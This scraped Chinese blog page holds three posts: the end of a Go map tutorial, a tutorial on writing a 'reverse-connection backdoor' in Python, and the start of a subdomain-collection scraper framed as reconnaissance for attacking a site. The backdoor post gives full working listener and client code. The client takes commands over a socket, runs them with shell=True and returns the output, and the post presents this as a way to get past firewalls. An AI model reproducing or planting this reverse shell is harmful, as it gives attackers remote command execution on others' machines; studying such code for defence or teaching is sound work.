class="string">&quot;three&quot;</span>] = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;第三个数字是: &quot;</span>, numbers[<span class="string">&quot;three&quot;</span>]) <span class="comment">// 读取数据</span></span><br><span class="line"><span class="comment">// 打印出来如:第三个数字是: 3</span></span><br></pre></td></tr></table></figure>

<p>这个 map 就像我们平常看到的表格一样，左边列是 key，右边列是值</p>
<p>使用 map 过程中需要注意的几点：</p>
<p>map 是无序的，每次打印出来的 map 都会不一样，它不能通过 index 获取，而必须通过 key 获取<br>map 的长度是不固定的，也就是和 slice 一样，也是一种引用类型<br>内置的 len 函数同样适用于 map，返回 map 拥有的 key 的数量<br>map 的值可以很方便的修改，通过 numbers[“one”]&#x3D;11 可以很容易的把 key 为 one 的字典值改为 11<br>在 Go 中，没有值可以安全地进行并发读写，它不是 thread-safe，在多个 go-routine 存取时，必须使用 mutex lock 机制<br>map 的初始化可以通过 key:val 的方式初始化值，同时 map 内置有判断是否存在 key 的方式</p>
<p>通过 delete 删除 map 的元素：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 初始化一个字典</span></span><br><span class="line">rating := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">float32</span>&#123;<span class="string">&quot;C&quot;</span>:<span class="number">5</span>, <span class="string">&quot;Go&quot;</span>:<span class="number">4.5</span>, <span class="string">&quot;Python&quot;</span>:<span class="number">4.5</span>, <span class="string">&quot;C++&quot;</span>:<span class="number">2</span> &#125;</span><br><span class="line"><span class="comment">// map 有两个返回值，第二个返回值，如果不存在 key，那么 ok 为 false，如果存在 ok 为 true</span></span><br><span class="line">csharpRating, ok := rating[<span class="string">&quot;C#&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;C# is in the map and its rating is &quot;</span>, csharpRating)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;We have no rating associated with C# in the map&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(rating, <span class="string">&quot;C&quot;</span>)  <span class="comment">// 删除key为C的元素</span></span><br></pre></td></tr></table></figure>



<p>转载文章：<a target="_blank" rel="noopener" href="https://learnku.com/docs/build-web-application-with-golang/022-go-foundation/3160">02.2. Go 基础 | 第二章. Go 语言基础 |《Go Web 编程》| Go 技术论坛 (learnku.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/14/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/14/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">反向连接后门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-14 13:04:19 / 修改时间：13:36:38" itemprop="dateCreated datePublished" datetime="2022-09-14T13:04:19+08:00">2022-09-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>后门常常分为正向后门，反向后门等，反向连接是客户端打开服务器端口，由服务器主动连接客户端。相比于正向连接，反向连接这种方式常用于绕过防火墙和路由器安全限制。我们这里主要讲解反向后门，用到了两个库，socket库，和subprocess库。</p>
<h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><p>我们来学习一下socket库，和subprocess库。</p>
<h2 id="————socket库————"><a href="#————socket库————" class="headerlink" title="————socket库————"></a>————socket库————</h2><p>Socket模块的主要目的就是帮助在网络上的两个程序之间建立信息通道。在python中提供了两个基本的Socket模块：服务端Socket和客户端Socket。当创建了一个服务端Socket之后，这个Socket就会在本机的一个端口上等待连接，客户端Socket会访问这个端口，当两者完成连接之后就能够进行交互了。在使用Socket进行编程时，需要先实例化一个Scoket类。</p>
<p>使用Socker建立服务端的思路主要是首先实例化一个 Socket类，然后开始循环监听，一直可以接收来自客户端的连接。成功建立连接之后，接收客户端发来的数据，并再向客户端发送数据，传输完毕之后，关闭这次连接。</p>
<p>使用Socket建立客户端则要简单得多，在实例化一个Socket类之后，连接一个远程的地址，这个地址由IP和端口组成。成功建立连接之后，开始发送和接收数据，传输完毕之后，关闭这次连接。</p>
<p>实例化格式 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(family,type[,protpcal])    </span><br></pre></td></tr></table></figure>

<p>第一个参数，family表示地址族，常用的协议族有：AF_INET、AF_INET6。</p>
<ul>
<li>AF_INET（TCP&#x2F;IP – IPv4）</li>
<li>AF_INET6（TCP&#x2F;IP – IPv6）</li>
</ul>
<p>第二个参数表示socket类型，这里使用的值有：SOCK_STREAM、SOCK_DGRAM</p>
<ul>
<li><p>SOCK_STREAM（TCP流）</p>
</li>
<li><p>SOCK_DGRAM（UDP数据报）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = socket(AF_INET,SOCK_STREAM) #一般来说这样实例化就好了</span><br></pre></td></tr></table></figure>

<p><u>常用函数</u>：</p>
<p>1.服务端函数</p>
<p>bind():由服务端调用，与ip地址与端口进行绑定</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.bind((&quot;127.0.0.1&quot;,8000))</span><br></pre></td></tr></table></figure>

<p>listen():由服务端开启监听模式，参数指定可以挂起的最大连接数量。这个参数的值最小为1，一般设置为5。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.listen(5)</span><br></pre></td></tr></table></figure>

<p>accept():这个函数用于在使用TCP的服务端接收连接，一般是阻塞态。接受TCP连接并返回(conn,adresse)， 其中，conn 是新的套接字对象，可以用来接收和发送数据； address是连接客户端的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn,addr = s.accept()</span><br></pre></td></tr></table></figure>

<p>2.客户端函数</p>
<p>send():这个函数用于在使用TCP时发送数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.send(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>

<p>recv():这个函数数用于在使用TCP时接收数据，参数代表接受数据的大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.recv(1024)</span><br></pre></td></tr></table></figure>

<p>close():关闭socket连接，记住创建连接后，一定要记得关闭连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.close</span><br></pre></td></tr></table></figure>

<p>真是socket常见函数的使用，更多的内容可以自行去搜索</p>
</li>
</ul>
<h2 id="————subprocess库————"><a href="#————subprocess库————" class="headerlink" title="————subprocess库————"></a>————subprocess库————</h2><p>subprocess 模块首先推荐使用的是它的 run 方法，更高级的用法可以直接使用 Popen 接口。我们后面主要用到的是popen方法。</p>
<h3 id="run-方法语法格式如下："><a href="#run-方法语法格式如下：" class="headerlink" title="run 方法语法格式如下："></a>run 方法语法格式如下：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)</span><br></pre></td></tr></table></figure>

<ul>
<li>args：表示要执行的命令。必须是一个字符串，字符串参数列表。</li>
<li>stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</li>
<li>timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</li>
<li>check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</li>
<li>encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</li>
<li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li>
</ul>
<h3 id="Popen-方法"><a href="#Popen-方法" class="headerlink" title="Popen() 方法"></a>Popen() 方法</h3><p>Popen 是 subprocess的核心，子进程的创建和管理都靠它处理。</p>
<p>构造函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, </span><br><span class="line">preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, </span><br><span class="line">startupinfo=None, creationflags=0,restore_signals=True, start_new_session=False, pass_fds=(),</span><br><span class="line">*, encoding=None, errors=None)</span><br></pre></td></tr></table></figure>

<p><strong>常用参数：</strong></p>
<ul>
<li>args：shell命令，可以是字符串或者序列类型（如：list，元组）</li>
<li>bufsize：缓冲区大小。当创建标准流的管道对象时使用，默认-1。<br>0：不使用缓冲区<br>1：表示行缓冲，仅当universal_newlines&#x3D;True时可用，也就是文本模式<br>正数：表示缓冲区大小<br>负数：表示使用系统默认的缓冲区大小。</li>
<li>stdin, stdout, stderr：分别表示程序的标准输入、输出、错误句柄</li>
<li>preexec_fn：只在 Unix 平台下有效，用于指定一个可执行对象（callable object），它将在子进程运行之前被调用</li>
<li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li>
<li>cwd：用于设置子进程的当前目录。</li>
<li>env：用于指定子进程的环境变量。如果 env &#x3D; None，子进程的环境变量将从父进程中继承。</li>
</ul>
<h1 id="代码阶段"><a href="#代码阶段" class="headerlink" title="代码阶段"></a>代码阶段</h1><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 建立socke连接</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    # bind端口，端口6666，要和客户端端口一致</span><br><span class="line">    shell_socket.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">    # listen监听 设置最大俩个连接。</span><br><span class="line">    shell_socket.listen(2)</span><br><span class="line">    # accept 接收 发送命令</span><br><span class="line">    new_shell,addr = shell_socket.accept()</span><br><span class="line">    while True:</span><br><span class="line">        command = input(&quot;~$&quot;)</span><br><span class="line">        new_shell.send(command.encode(&quot;gbk&quot;))</span><br><span class="line">        # 显示 数据</span><br><span class="line">        data = new_shell.recv(2048).decode(&quot;gbk&quot;) </span><br><span class="line">        if data:</span><br><span class="line">            print (data)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    # 关闭连接</span><br><span class="line">    new_shell.close()</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import subprocess,socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = 6666  #和服务端端口一致</span><br><span class="line">    # 建立socket</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    # connect连接</span><br><span class="line">    shell_socket.connect((ip,port))</span><br><span class="line">    # 接收数据</span><br><span class="line">    while True:</span><br><span class="line">        data = shell_socket.recv(1024).decode(&quot;gbk&quot;)</span><br><span class="line">        # subprocess执行shell命令</span><br><span class="line">        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE) #data代表指令，其他三个代表，标准输入，标准输出和错误输出</span><br><span class="line">        STDOUT,STDERR = command.communicate()</span><br><span class="line">        # byte 类型区别于 python2.X</span><br><span class="line">        # 发送输出命令</span><br><span class="line"></span><br><span class="line">        shell_socket.send(STDOUT) # 直接发送bytes</span><br><span class="line">    # 关闭socket</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h1><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    shell_socket.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">    shell_socket.listen(2)</span><br><span class="line">    new_shell,addr = shell_socket.accept()</span><br><span class="line">    while True:</span><br><span class="line">        command = input(&quot;~$&quot;)</span><br><span class="line">        new_shell.send(command.encode(&quot;gbk&quot;))</span><br><span class="line">        data = new_shell.recv(2048).decode(&quot;gbk&quot;)</span><br><span class="line">        if data:</span><br><span class="line">            print (data)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    new_shell.close()</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import subprocess,socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = 6666</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    shell_socket.connect((ip,port))</span><br><span class="line">    while True:</span><br><span class="line">        data = shell_socket.recv(1024).decode(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)</span><br><span class="line">        STDOUT,STDERR = command.communicate()</span><br><span class="line">        shell_socket.send(STDOUT) </span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><p>先运行服务端，在运行客户端，服务端显示这个界面</p>
<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/dasdcacjcacc.png"></p>
<p>输入命令whoami</p>
<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdafahfhafaggzv.png"></p>
<p>输入命令ipconfig</p>
<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/addasifiofovac.png"></p>
<p>运行成功</p>
<p>subprocess 借鉴文章：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/python3-subprocess.html">Python3 subprocess | 菜鸟教程 (runoob.com)</a></p>
<p>socket库借鉴文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/105326616">https://blog.csdn.net/qq_42967398/article/details/105326616</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/07/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/07/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%99%A8/" class="post-title-link" itemprop="url">子域名收集器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-07 13:15:44 / 修改时间：14:03:40" itemprop="dateCreated datePublished" datetime="2022-09-07T13:15:44+08:00">2022-09-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里用到了两个库，requests库，和bs4库，看这一篇文章时，建议先去看看我的另一篇文章：简单爬虫</p>
<p><a target="_blank" rel="noopener" href="http://chunquchunlai.top/2022/08/27/%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/">简单爬虫 | RISE (chunquchunlai.top)</a></p>
<p>子域名是某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。例如：<a target="_blank" rel="noopener" href="http://www.xxxxx.com主域不存在漏洞,并且防护措施严密,而二级域名/">www.xxxxx.com主域不存在漏洞，并且防护措施严密，而二级域名</a> edu.xxxxx.com存在漏洞，并且防护措施松散，那么就可以采用迂回战术拿下子域名，然后逐步靠近主域。<br>收集子域名的方法有很多，包括DNS历史解析，暴力枚举，第三方网站查询等，这里我们只使用了第三方网站进行查询，然后爬虫爬取。</p>
<h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><p>我们来学习一下requests库和bs4库</p>
<h2 id="—————requests库————"><a href="#—————requests库————" class="headerlink" title="—————requests库————"></a>—————requests库————</h2><p>常用的请求方法</p>
<p>1.requests.get()</p>
<p>该方法用于 GET 请求，表示向网站发起请求，获取页面响应对象。语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(url,headers=headers,params,timeout)</span><br></pre></td></tr></table></figure>

<p>参数说明如下：<br>url：要抓取的 url 地址。</p>
<p>headers：用于包装请求头信息。</p>
<p>params：请求时携带的查询字符串参数。</p>
<p>timeout：超时时间，超过时间会抛出异常。</p>
<p>2.requests.post()</p>
<p>该方法用于 POST 请求，先由用户向目标 url 提交数据，然后服务器返回一个HttpResponse 响应，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response=requests.post(url,headers，data=&#123;请求体的字典&#125;)</span><br></pre></td></tr></table></figure>

<p>url：要抓取的 url 地址。</p>
<p>headers：用于包装请求头信息。</p>
<p>data：要传输的数据</p>
<p>当我们使用 Requests 模块向一个 URL 发起请求后会返回一个 HttpResponse 响应，该对象具有以下常用属性：</p>
<p>默认是返回状态码</p>
<p>encoding：查看或者指定响应字符编码<br>url	：      查看请求的 url 地址<br>headers：查看请求头信息<br>cookies： 查看cookies 信息<br>text：        以字符串形式输出<br>content： 以字节流形式输出，若要保存下载图片需使用该属性。</p>
<h3 id="关于headers信息"><a href="#关于headers信息" class="headerlink" title="关于headers信息"></a>关于headers信息</h3><p>由于requests库本质是发包，所以访问网站时必须带有一些信息，如浏览器信息，cookie信息等，所以这里我们要写入网站url地址和header信息，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;https://www.baidu.com/&quot;  #这里拿百度的地址举例</span><br><span class="line">header = &#123;</span><br><span class="line">   &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 获取header信息我用的是burpsuite，这里的header我只输入了浏览器信息，有些网站可能要求需要cookie等信息，注意header是一个字典信息，要给键和值添加双引号(“”),多个键值对用逗号隔开。（其他获取heade信息的方法可以在网上查询）</p>
<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/qwesdasd.png"></p>
<h2 id="——————bs4库——————"><a href="#——————bs4库——————" class="headerlink" title="——————bs4库——————"></a>——————bs4库——————</h2><p>bs4解析对象</p>
<p>创建 BS4 解析对象是万事开头的第一步，这非常地简单，语法格式如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#导入解析包</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">#创建beautifulsoup解析对象</span><br><span class="line">soup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;)</span><br></pre></td></tr></table></figure>

<p>这串代码中，html_doc 表示要解析的文档 ，html.parser 表示用到的解析器</p>
<p>bs4常用用法</p>
<p>1.tag节点</p>
<p>标签（Tag）是组成 HTML 文档的基本元素。在 BS4 中，通过标签名和标签属性可以提取出想要的内容。</p>
<p>2.find_all()</p>
<p>find_all() 方法用来搜索当前 tag 的所有子节点，并判断这些节点是否符合过滤条件，最后以列表形式将符合条件的内容返回，</p>
<p>3.find()</p>
<p>find() 方法与 find_all() 类似，不同之处在于 find_all() 会将文档中所有符合条件的结果返回，而 find() 仅返回一个符合条件的结果，所以 find() 方法没有<code>limit</code>参数</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>第一步，导入库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br></pre></td></tr></table></figure>

<p>第二步，从查子域获取子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def czy(urls):   #从查子域网站获取子域名</span><br><span class="line">    url = &#x27;https://chaziyu.com/&#x27;+str(urls)</span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;BAIDU_SSP_lcr=https://www.baidu.com/link?url=G6Z8y2tur1nTS4StdwzTd-i-z2l7NblTl3YnJh6mfWg7zK6cD7F7ZoVOSH2M3Rx6&amp;wd=&amp;eqid=a690ccbd000144ad0000000663046c7b; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; cz_statistics_visitor=4a4d8650-aa21-09c6-932c-8b7ac1147740; qHistory=aHR0cDovL3dob2lzLmNoaW5hei5jb20vX1dob2lz5p+l6K+ifGh0dHA6Ly90b29sLmNoaW5hei5jb20vc3ViZG9tYWluL1/lrZDln5/lkI3mn6Xor6I=; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234469; toolbox_urls=badui.com; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234446&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br><span class="line">    &#125;      #输入</span><br><span class="line">    response = requests.get(url=url, headers=header) # 获得get请求</span><br><span class="line">    bf = BeautifulSoup(response.text, &#x27;html.parser&#x27;) # 获得bs4解析对象</span><br><span class="line">    suop = bf.find_all(&#x27;a&#x27;, target=&#x27;_blank&#x27;)   # 通过标签获得想要的内容（为什么这么写，去看看我简单爬虫的那篇文章）</span><br><span class="line">    list1 = []    #创建一个列表</span><br><span class="line">    for i in suop:  #遍历soup，将里面的内容遍历出来</span><br><span class="line">        a = i.string</span><br><span class="line">        list1.append(a) #将遍历内容放入list1</span><br><span class="line">    return list1   # 返回list1的值</span><br></pre></td></tr></table></figure>

<p>第三步，从另一个网站获取子域名</p>
